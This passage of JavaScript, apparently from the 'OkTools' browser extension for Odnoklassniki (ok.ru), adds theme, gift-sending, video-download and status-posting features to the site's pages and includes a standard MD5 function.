					sendRequest({action: 'get_theme', id: data.tid, guid:'0', ok_id:data.ok_id, user:user}, function(data){							
						get_theme(data);
					});	
					var otl=doc.getElementById("oktools_theme_lst") || null;
					if(otl)
					{
						var cci=otl.getElementsByClassName("covers_cat_inf") || null;
						if(cci)
						{
							for (var i=0;i<cci.length;i++)
							{
								cci[i].parentNode.removeChild(cci[i]);
							}
						}
						var t=doc.getElementById("ok_theme_id_"+data.tid+"") || null;
						if(t)
						{
							var c=t.getElementsByClassName("covers_cat_descr")[0] || null;
							if(c)
							{
								var ust=create_dom('div', c, '', {"class":"covers_cat_inf"}, language_text("ok_theme_ust"));
									create_dom('div', ust, '', {"class":"covers_cat_badge ic-checkbox__active"}, "");
							}
						}	
					}
				}
			},false);
		}		
	}
	else if ((host=='paymentnew.odnoklassniki.ru') || (host=='paymentnew.ok.ru') || (host=='paymenttg.ok.ru'))
	{ 
		var gift_uid=0;
		var gift_id=0;
		var gift_music=0;
		var gift_priv=0;
		var gift_tain=0;
		var gift_type=0;
		var message='';
		var p_b=doc.getElementById("proceedButton") || null;
		if(p_b)
		{
			var par=p_b.parentNode;
			if (!p_b.hasAttribute('ok_fr'))
			{
				p_b.setAttribute('ok_fr', true);
				var button=create_dom('div', par, p_b, {"class":"ok_button_gift_send"}, language_text("ok_gift_butt"));
				var message='';
				var priv=0;	
				var img_url="";
				var gift=doc.getElementsByClassName("gift")[0] || null;
				if(gift)
				{
					var background=gift.getAttribute('style');
					if (gift_id==0)				
					{
						var res=background.match(/photoId=([0-9]+)/i);
						if (res && res.length > 1)
						{									
							gift_id=res[1];				
						}
					}					
					var typ=background.match(/type=([0-9]+)/i);
					if (typ && typ.length > 1)
					{									
						gift_type=typ[1];				
					}									
				}
				if (gift_id==0)				
				{
					var a=doc.getElementById("js-video") || null;
					if(a)
					{
						var poster=a.getAttribute('poster');
						if (gift_id==0)				
						{
							var res=poster.match(/photoId=([0-9]+)/i);
							if (res && res.length > 1)
							{									
								gift_id=res[1];				
							}
						}					
						var typ=poster.match(/type=([0-9]+)/i);
						if (typ && typ.length > 1)
						{									
							gift_type=typ[1];				
						}	
					}
				}					
				if ((gift_id==0) || (gift_uid==0))				
				{
					var a=doc.getElementById("selectMusicTrackLink") || null;
					if(a)
					{
						var hr=a.getAttribute('href');
						if (/([0-9]+),([0-9]+)/gi.test(hr))
						{
							var res=hr.match(/([0-9]+),([0-9]+)/i);
							if (res && res.length > 1)
							{	
								gift_id=res[1];
								gift_uid=res[2];
							}
						}							
					}
				}							
				sendRequest({action: 'load_option', param: 'OkGiftId'}, function(result) {
					if (gift_id==0)
					{
						gift_id=result;	
					}							
				}, false);
				sendRequest({action: 'load_option', param: 'OkGiftUid'}, function(result) {
					if (gift_uid==0)	
					{
						gift_uid=result;
					}						
				}, false);				
				button.addEventListener('click', function(e) {	
					this.textContent="Отправка подарка. ЖДИТЕ ...";
					var m=doc.getElementById("itx-2") || null;
					if (m)
					{
						message=m.value;
					}
					var m111=doc.getElementById("m111") || null;
					if(m111)
					{
						gift_priv=m111.checked;
					}
					var m222=doc.getElementById("m222") || null;
					if(m222)
					{					
						gift_tain=m222.checked;
					}
					var m333=doc.getElementById("m333") || null;
					if(m333)
					{					
						gift_priv=m333.checked;
					}
					sendRequest({action: 'get_gift_anim', url: 'https://dp.mycdn.me/getImage?photoId='+gift_id+'&type=9'}, function(data) {
						if (data)
						{	
							gift_type=9;
						}	
						send_gift_data(gift_uid, gift_id, gift_priv, gift_tain, '0', message, gift_type);
						var img_url="https://dp.mycdn.me/getImage?photoId="+gift_id+"&type="+gift_type+"";
						window.parent.postMessage({action: "SendMessage", uid:gift_uid, img:img_url, message:message}, '*');
					});					
					e.stopPropagation();														
				}); 
			}
		}		
	}	
	else if (/(oktools)+\.[a-z]{2,6}/i.test(host))
	{
		var button_install=doc.getElementById("oktools_button_install")|| null;
		if (button_install)
		{
			var plugin_ver=button_install.getAttribute(browser);
			if (plugin_ver>version)
			{
				button_install.setAttribute('class', 'button_install update_ok');
				button_install.textContent=language_text("ok_tools_update");
			}
			else
			{
				button_install.setAttribute('class', 'button_install install_ok');
				button_install.textContent=language_text("ok_tools_site");
			}
		}							
	}
}
function video_search()
{
	var vcch=doc.getElementsByClassName("vid-card_cnt h-mod") || null;
	if (vcch)
	{ 
		for (var v=0;v<vcch.length;v++)
		{			
			var parent=vcch[v].parentNode.parentNode;
			if (parent.classList.contains("vp-layer_cnt"))
			{
				var option=vcch[v].getAttribute('data-options');
				var val_data0=JSON.parse(option);	
				var val_data=JSON.parse(val_data0.flashvars.metadata);
				if(val_data.provider=="UPLOADED_ODKL" || val_data.provider=="YKL" || val_data.provider=="PARTNER")
				{						
					var control_list=parent.getElementsByClassName('widget-list')[0] || null;
					if (control_list)
					{ 
						var list_i=control_list.getElementsByClassName('widget-list_i')[0] || null;							
						var li_control=create_dom('li', control_list, list_i, {"class":"widget-list_i"}, '');								
							var div=create_dom('div', li_control, '', {"data-compact":"true"}, '');
								var div1=create_dom('div', div, '', {"class":"widget __compact"}, '');
									var div_link=create_dom('div', div1, '', {"class":"widget __compact oktools_video_save"}, ''+language_text("od_button")+'');												
									var link_content=create_dom('div', div_link, '', {"class":"oktools_video_content","style":"display:none"}, '');
										var link_d=create_dom('div', link_content, '', {"class":"oktools_video_content_link",}, '');
										create_dom('div', link_content, '', {"class":"oktools_video_content_arr"}, '');
							div_link.addEventListener('mouseover', function(e) {
								visible_diva(link_content, "block", "")
							});
							div_link.addEventListener('mouseout', function(e) {
								visible_diva(link_content, "none", "")
							});
					}
					var data_video=val_data.videos;
					if(data_video)
					{
						for(var d = 0; d < data_video.length; d++) 
						{  				
							if(data_video[d].name=="mobile")
							{
								var kachestvo=language_text("ok_video_0");
							}
							else if(data_video[d].name=="lowest")
							{
								var kachestvo=language_text("ok_video_1");
							}
							else if(data_video[d].name=="low")
							{
								var kachestvo=language_text("ok_video_2");
							}
							else if(data_video[d].name=="sd")
							{
								var kachestvo=language_text("ok_video_3");
							}
							else if(data_video[d].name=="hd")
							{
								var kachestvo=language_text("ok_video_4");
							}
							else if(data_video[d].name=="full")
							{
								var kachestvo=language_text("ok_video_5");
							}
							else if(data_video[d].name=="quad")
							{
								var kachestvo=language_text("ok_video_6");
							}
							else if(data_video[d].name=="ultra")
							{
								var kachestvo=language_text("ok_video_7");
							}
							else
							{
								var kachestvo=data_video[d].name;
							}			
							var tit=val_data.movie.title.replace(/"/g, "");
							var tit=tit.replace(/'/g, "");
							var title=''+tit+'_'+kachestvo+'.mp4';			
							var bytes='&bytes=0-100000000';
							var url=data_video[d].url.replace(/ct=0/gi, "ct=4");
							var li=create_dom('a', link_d, '', {"href":""+url+""+bytes+"","download":""+title+""}, ''+kachestvo+'');
							li.addEventListener('click', function(e) {download_file(e);}, true);									
						}
					}
				}
				else
				{
					var control_list=parent.getElementsByClassName('widget-list')[0] || null;
					if (control_list)
					{ 
						var list_i=control_list.getElementsByClassName('widget-list_i')[0] || null;
						var li_control=create_dom('li', control_list, list_i, {"class":"widget-list_i"}, '');								
							var div=create_dom('div', li_control, '', {"data-compact":"true"}, '');
								var div1=create_dom('div', div, '', {"class":"widget __compact"}, '');
									var div_link=create_dom('div', div1, '', {"class":"widget __compact oktools_video_save"}, ''+language_text("ok_video_not")+'');															
					}
				}

			}
			
		}	
	}	
}
function reload_size(prin, iframe)
{
	var client_height=getClientHeight()-100;
	if (client_height!=client_height_prev || prin)
	{
		client_height_prev=client_height;
		if (client_height<300) {client_height=300;}
		if (client_height>800) {client_height=800;}
		var ok_win=doc.getElementById("ok_window_block") || null;
		if (ok_win)
		{			
			var height_minus=0;
			var ok_win_con_menu=doc.getElementById("ok_window_content_menu") || null;
			if (ok_win_con_menu.style.display=="none" || ok_win_con_menu.style.display=="") 
			{
				height_minus=height_minus+30;
			}
			var ok_win_con_hr=doc.getElementById("ok_window_content_hr") || null;
			if (ok_win_con_hr.style.display=="none" || ok_win_con_hr.style.display=="") 
			{
				height_minus=height_minus+3;
			}	
			var ok_win_con_page=doc.getElementById("ok_window_content_page") || null;
			if (ok_win_con_page.style.display=="none" || ok_win_con_page.style.display=="") 
			{
				height_minus=height_minus+29;
			}
			var cat_hei=client_height-60;
			var cont_hei=client_height-113+height_minus;
			ok_win.setAttribute('style', 'height:'+client_height+'px;');
			var window_cat=doc.getElementById("ok_window_cat") || null;
			if (window_cat)
			{				
				window_cat.setAttribute('style','overflow-y: auto;height:'+cat_hei+'px;');
			}		
			var window_content=doc.getElementById("ok_window_content") || null;
			if (window_content)
			{		
				if (iframe)
				{
					var oktoo_iframe=doc.getElementById("ok_window_content_table") || null;
					if (oktoo_iframe)
					{	
						var ifr_height=cont_hei-2;			
						window_content.setAttribute('style','overflow-y: hidden;overflow-x: hidden;height:'+cont_hei+'px;');
						oktoo_iframe.setAttribute('style','height:'+ifr_height+'px;');
					}	
					else
					{
						window_content.setAttribute('style','overflow-y: auto;overflow-x: hidden;height:'+cont_hei+'px;');
						
					}
				}
				else
				{
					window_content.setAttribute('style','overflow-y: auto;overflow-x: hidden;height:'+cont_hei+'px;');					
				}
			}	
			var window_conload=doc.getElementById("ok_window_content_load") || null;
			if (window_conload)
			{			
				var conload=cat_hei+8;
				window_conload.setAttribute('style','height:'+conload+'px;');
			}
		}
	}
}
function set_status(text)
{
	//console.log('SET STATUS');
	var form=Math.round(Math.random(0,2000000)*1000);
	var content_var=get_content_var();
	var data = encodeURIComponent('{"formType":"Status", "postDataList":[{"subId":-1, "textData":{"text":"'+text+'"}}], "toStatus":true, "topicId":"0", "nextGenId":0, "advertCategory":0, "advertSold":"false", "advertLifeTime":0}');
	var send_data="st.status.postpostForm="+form+"&postingFormData="+data+"";
	var url="https://ok.ru/dk?cmd=MediaTopicPost&gwt.requested="+content_var.gwtHash+"&st.cmd=userMain&st.openPanel=messages";
	//console.log('|'+url+'|'+send_data);
	sendRequest({action: 'ajaxPost', uid:'', url:url, data:send_data, token:content_var.token}, function(data) {		
		alert('Статус установлен. Страница буде перезагружена.');
		window.document.location.reload();
	});
}
function elem_click(elem) 
{	
	elem.focus();
	elem.click();
}
function fun_md5(str)
{
    var xl;

    var rotateLeft = function (lValue, iShiftBits) {
      return (lValue << iShiftBits) | (lValue >>> (32 - iShiftBits));
    };

    var addUnsigned = function (lX, lY) {
      var lX4, lY4, lX8, lY8, lResult;
      lX8 = (lX & 0x80000000);
      lY8 = (lY & 0x80000000);
      lX4 = (lX & 0x40000000);
      lY4 = (lY & 0x40000000);
      lResult = (lX & 0x3FFFFFFF) + (lY & 0x3FFFFFFF);
      if (lX4 & lY4) {
        return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
      }
      if (lX4 | lY4) {
        if (lResult & 0x40000000) {
          return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
        } else {
          return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
        }
      } else {
        return (lResult ^ lX8 ^ lY8);
      }
    };

    var _F = function (x, y, z) {
      return (x & y) | ((~x) & z);
    };
    var _G = function (x, y, z) {
      return (x & z) | (y & (~z));
    };
    var _H = function (x, y, z) {
      return (x ^ y ^ z);
    };
    var _I = function (x, y, z) {
      return (y ^ (x | (~z)));
    };

    var _FF = function (a, b, c, d, x, s, ac) {
      a = addUnsigned(a, addUnsigned(addUnsigned(_F(b, c, d), x), ac));
      return addUnsigned(rotateLeft(a, s), b);
    };

    var _GG = function (a, b, c, d, x, s, ac) {
      a = addUnsigned(a, addUnsigned(addUnsigned(_G(b, c, d), x), ac));
      return addUnsigned(rotateLeft(a, s), b);
    };

    var _HH = function (a, b, c, d, x, s, ac) {
      a = addUnsigned(a, addUnsigned(addUnsigned(_H(b, c, d), x), ac));
      return addUnsigned(rotateLeft(a, s), b);
    };

    var _II = function (a, b, c, d, x, s, ac) {
      a = addUnsigned(a, addUnsigned(addUnsigned(_I(b, c, d), x), ac));
      return addUnsigned(rotateLeft(a, s), b);
    };

    var convertToWordArray = function (str) {
      var lWordCount;
      var lMessageLength = str.length;
      var lNumberOfWords_temp1 = lMessageLength + 8;
      var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
      var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
      var lWordArray = new Array(lNumberOfWords - 1);
      var lBytePosition = 0;
      var lByteCount = 0;
      while (lByteCount < lMessageLength) {
        lWordCount = (lByteCount - (lByteCount % 4)) / 4;
        lBytePosition = (lByteCount % 4) * 8;
        lWordArray[lWordCount] = (lWordArray[lWordCount] | (str.charCodeAt(lByteCount) << lBytePosition));
        lByteCount++;
      }
      lWordCount = (lByteCount - (lByteCount % 4)) / 4;
      lBytePosition = (lByteCount % 4) * 8;
      lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 << lBytePosition);
      lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
      lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
      return lWordArray;
    };

    var wordToHex = function (lValue) {
      var wordToHexValue = "",
        wordToHexValue_temp = "",
        lByte, lCount;
      for (lCount = 0; lCount <= 3; lCount++) {
        lByte = (lValue >>> (lCount * 8)) & 255;
        wordToHexValue_temp = "0" + lByte.toString(16);
        wordToHexValue = wordToHexValue + wordToHexValue_temp.substr(wordToHexValue_temp.length - 2, 2);
      }
      return wordToHexValue;
    };

    var x = [],
      k, AA, BB, CC, DD, a, b, c, d, S11 = 7,
      S12 = 12,
      S13 = 17,
      S14 = 22,
      S21 = 5,
      S22 = 9,
      S23 = 14,
      S24 = 20,
      S31 = 4,
      S32 = 11,
      S33 = 16,
      S34 = 23,
      S41 = 6,
      S42 = 10,
      S43 = 15,
      S44 = 21;

    //str = this.utf8_encode(str);
    x = convertToWordArray(str);
    a = 0x67452301;
    b = 0xEFCDAB89;
    c = 0x98BADCFE;
    d = 0x10325476;

    xl = x.length;
    for (k = 0; k < xl; k += 16) {
      AA = a;
      BB = b;
      CC = c;
      DD = d;
      a = _FF(a, b, c, d, x[k + 0], S11, 0xD76AA478);
      d = _FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756);
      c = _FF(c, d, a, b, x[k + 2], S13, 0x242070DB);
      b = _FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE);
      a = _FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF);
      d = _FF(d, a, b, c, x[k + 5], S12, 0x4787C62A);
      c = _FF(c, d, a, b, x[k + 6], S13, 0xA8304613);
      b = _FF(b, c, d, a, x[k + 7], S14, 0xFD469501);
      a = _FF(a, b, c, d, x[k + 8], S11, 0x698098D8);
      d = _FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF);
      c = _FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1);
      b = _FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE);
      a = _FF(a, b, c, d, x[k + 12], S11, 0x6B901122);
      d = _FF(d, a, b, c, x[k + 13], S12, 0xFD987193);
      c = _FF(c, d, a, b, x[k + 14], S13, 0xA679438E);
      b = _FF(b, c, d, a, x[k + 15], S14, 0x49B40821);
      a = _GG(a, b, c, d, x[k + 1], S21, 0xF61E2562);
      d = _GG(d, a, b, c, x[k + 6], S22, 0xC040B340);
      c = _GG(c, d, a, b, x[k + 11], S23, 0x265E5A51);
      b = _GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA);
      a = _GG(a, b, c, d, x[k + 5], S21, 0xD62F105D);
      d = _GG(d, a, b, c, x[k + 10], S22, 0x2441453);
      c = _GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681);
      b = _GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8);
      a = _GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6);
      d = _GG(d, a, b, c, x[k + 14], S22, 0xC33707D6);
      c = _GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87);
      b = _GG(b, c, d, a, x[k + 8], S24, 0x455A14ED);
      a = _GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905);
      d = _GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8);
      c = _GG(c, d, a, b, x[k + 7], S23, 0x676F02D9);
      b = _GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A);
      a = _HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942);
      d = _HH(d, a, b, c, x[k + 8], S32, 0x8771F681);
      c = _HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122);
      b = _HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C);
      a = _HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44);
      d = _HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9);
      c = _HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60);
      b = _HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70);
      a = _HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6);
      d = _HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA);
      c = _HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085);
      b = _HH(b, c, d, a, x[k + 6], S34, 0x4881D05);
      a = _HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039);
      d = _HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5);
      c = _HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8);
      b = _HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665);
      a = _II(a, b, c, d, x[k + 0], S41, 0xF4292244);
      d = _II(d, a, b, c, x[k + 7], S42, 0x432AFF97);
      c = _II(c, d, a, b, x[k + 14], S43, 0xAB9423A7);
      b = _II(b, c, d, a, x[k + 5], S44, 0xFC93A039);
      a = _II(a, b, c, d, x[k + 12], S41, 0x655B59C3);
      d = _II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92);
      c = _II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D);
      b = _II(b, c, d, a, x[k + 1], S44, 0x85845DD1);
      a = _II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F);
      d = _II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0);
      c = _II(c, d, a, b, x[k + 6], S43, 0xA3014314);
      b = _II(b, c, d, a, x[k + 13], S44, 0x4E0811A1);
      a = _II(a, b, c, d, x[k + 4], S41, 0xF7537E82);
      d = _II(d, a, b, c, x[k + 11], S42, 0xBD3AF235);
      c = _II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB);
      b = _II(b, c, d, a, x[k + 9], S44, 0xEB86D391);
      a = addUnsigned(a, AA);
      b = addUnsigned(b, BB);
      c = addUnsigned(c, CC);
      d = addUnsigned(d, DD);
    }

    var temp = wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d);

    return temp.toLowerCase();
}
 
function getPosition(e){
    var left = 0
    var top  = 0
    while (e.offsetParent){
        left += e.offsetLeft
        top  += e.offsetTop
        e    = e.offsetParent
    }
    left += e.offsetLeft
    top  += e.offsetTop
    return {x:left, y:top}
}
})();